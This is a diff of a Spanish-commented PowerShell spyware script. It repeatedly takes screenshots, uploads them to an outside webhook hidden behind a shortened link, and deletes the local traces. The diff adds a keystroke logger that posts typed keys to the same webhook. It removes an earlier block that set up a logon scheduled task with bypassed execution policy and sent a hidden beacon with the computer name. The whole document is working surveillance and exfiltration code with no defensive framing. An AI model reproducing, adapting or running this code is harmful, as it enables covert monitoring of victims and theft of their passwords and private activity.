@@ -1,3 +1,11 @@
+# Instala el módulo InputSimulator si no está instalado
+if (-not (Get-Module -Name "InputSimulator" -ListAvailable)) {
+    Install-Module -Name "InputSimulator" -Scope CurrentUser -Force
+}
+
+# Importa el módulo InputSimulator
+Import-Module -Name "InputSimulator"
+
 # Define la URL del webhook
 $hookurl = "https://bit.ly/web_chupakbras"
 
@@ -9,6 +17,22 @@ $sendInterval = 300 # 5 minutos
 
 # Variable para contar las capturas
 $counter = 0
+
+# Función para capturar pulsaciones del teclado y enviarlas al webhook
+function CaptureAndSendKeystrokes {
+    $keystrokes = @()
+    
+    # Captura las pulsaciones del teclado durante 30 segundos
+    $endTime = (Get-Date).AddSeconds(30)
+    while ((Get-Date) -lt $endTime) {
+        $key = [Console]::ReadKey($true)
+        $keystrokes += $key.KeyChar
+    }
+    
+    # Convierte las pulsaciones del teclado en una cadena y envíalas al webhook
+    $keystrokesString = $keystrokes -join ""
+    Invoke-WebRequest -Uri $hookurl -Method Post -Body "{""keystrokes"":""$keystrokesString""}" -ContentType "application/json"
+}
 
 # Función para tomar una captura de pantalla
 function TakeScreenshot {
@@ -25,80 +49,18 @@ function TakeScreenshot {
     $counter++
 }
 
-# Define el script de capturas
-$scriptCapturas = @"
-# Función para tomar una captura de pantalla
-function TakeScreenshot {
-    # Crea un objeto Bitmap para la captura de pantalla
-    \$bitmap = New-Object System.Drawing.Bitmap \$Width, \$Height
-    \$graphic = [System.Drawing.Graphics]::FromImage(\$bitmap)
-    \$graphic.CopyFromScreen(\$Left, \$Top, 0, 0, \$bitmap.Size)
-    
-    # Guarda la captura de pantalla en un archivo temporal
-    \$Filett = "\$TempFolder\SC\$counter.png"
-    \$bitmap.Save(\$Filett, [System.Drawing.Imaging.ImageFormat]::png)
-    
-    # Incrementa el contador
-    \$counter++
-}
-
-# Obtiene la resolución de la pantalla
-\$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-\$Width = \$Screen.Width
-\$Height = \$Screen.Height
-\$Left = \$Screen.Left
-\$Top = \$Screen.Top
-
-# Crea la carpeta temporal para almacenar las capturas
-\$TempFolder = "\$env:temp\sysw"
-if (-not (Test-Path -Path \$TempFolder)) {
-    New-Item -ItemType Directory -Path \$TempFolder | Out-Null
-}
-
-# Realiza la captura de pantalla y envía las capturas
-while (\$true) {
-    # Realiza la captura de pantalla
-    TakeScreenshot
-
-    # Si se alcanza el tiempo para enviar las imágenes, envía todas las capturas
-    if (\$counter -gt 0 -and \$counter % (\$sendInterval / \$seconds) -eq 0) {
-        Write-Host "Enviando imágenes..."
-        Get-ChildItem -Path \$TempFolder -Filter "*.png" | ForEach-Object {
-            Start-Process -FilePath 'curl.exe' -ArgumentList "-F 'file1=@\$_.FullName' $hookurl" -NoNewWindow -WindowStyle Hidden
-            Remove-Item -Path \$_.FullName -Force
-        }
-        \$counter = 0
-    }
-
-    # Espera el tiempo definido antes de tomar la siguiente captura de pantalla
-    Start-Sleep \$seconds
-}
-"@
-
-# Definir el directorio temporal
-$TempFolder = "$env:temp\sysw"
-if (-not (Test-Path -Path $TempFolder)) {
-    New-Item -ItemType Directory -Path $TempFolder | Out-Null
-}
-
-# Crear el script de capturas
-Set-Content -Path "$TempFolder\capturas.ps1" -Value $scriptCapturas
-
-# Crea la tarea programada para ejecutar el script al iniciar sesión en Windows
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File ""$TempFolder\capturas.ps1"""
-$trigger = New-ScheduledTaskTrigger -AtLogon
-Register-ScheduledTask -TaskName "Capturas de pantalla" -Action $action -Trigger $trigger -RunLevel Highest -Force
-
-# Envía un mensaje al webhook al iniciar Windows
-Write-Host "Enviando mensaje al webhook..."
-Start-Process -FilePath 'curl.exe' -ArgumentList "-d '{""message"":""Computador encendido ($env:COMPUTERNAME)""}' -H 'Content-Type: application/json' -X POST $hookurl" -NoNewWindow -WindowStyle Hidden
-
 # Obtiene la resolución de la pantalla
 $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
 $Width = $Screen.Width
 $Height = $Screen.Height
 $Left = $Screen.Left
 $Top = $Screen.Top
+
+# Crea la carpeta temporal para almacenar las capturas
+$TempFolder = "$env:temp\sysw"
+if (-not (Test-Path -Path $TempFolder)) {
+    New-Item -ItemType Directory -Path $TempFolder | Out-Null
+}
 
 # Realiza la captura de pantalla y envía las capturas
 while ($true) {
@@ -109,11 +71,14 @@ while ($true) {
     if ($counter -gt 0 -and $counter % ($sendInterval / $seconds) -eq 0) {
         Write-Host "Enviando imágenes..."
         Get-ChildItem -Path $TempFolder -Filter "*.png" | ForEach-Object {
-            Start-Process -FilePath 'curl.exe' -ArgumentList "-F 'file1=@$($_.FullName)' $hookurl" -NoNewWindow -WindowStyle Hidden
+            Invoke-WebRequest -Uri $hookurl -Method Post -InFile $_.FullName
             Remove-Item -Path $_.FullName -Force
         }
         $counter = 0
     }
+
+    # Captura pulsaciones del teclado cada 30 segundos y envíalas al webhook
+    CaptureAndSendKeystrokes
 
     # Espera el tiempo definido antes de tomar la siguiente captura de pantalla
     Start-Sleep $seconds
